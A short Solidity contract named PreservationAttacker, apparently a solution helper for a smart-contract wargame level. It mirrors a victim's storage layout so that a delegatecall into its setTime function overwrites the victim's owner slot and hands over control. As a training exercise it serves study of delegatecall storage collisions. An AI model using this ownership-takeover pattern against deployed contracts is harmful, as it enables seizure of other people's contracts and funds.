// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

contract PreservationAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    address public victim;

    constructor(address _addr) {
        victim = _addr;
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
